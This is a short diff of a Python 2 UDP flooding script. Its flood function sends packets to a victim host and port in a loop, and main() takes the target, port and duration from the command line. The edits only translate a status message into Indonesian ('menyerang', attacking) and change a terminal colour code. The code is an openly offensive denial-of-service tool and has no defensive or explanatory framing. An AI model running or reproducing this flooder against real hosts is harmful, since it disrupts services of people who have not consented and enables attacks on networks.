@@ -38,7 +38,7 @@ def flood (victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "Attacking %s sent packages %s at the port %s "%(sent, victim, vport)
+        print "menyerang %s paket terkirim %s at ke port %s "%(sent, victim, vport)
 
 def main():
     print len(sys.argv)
@@ -46,7 +46,7 @@ def main():
         usage()
     else:
         flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
-print "\033[1;91m"
+print "\033[32m"
 if __name__ == '__main__':
     main()
 
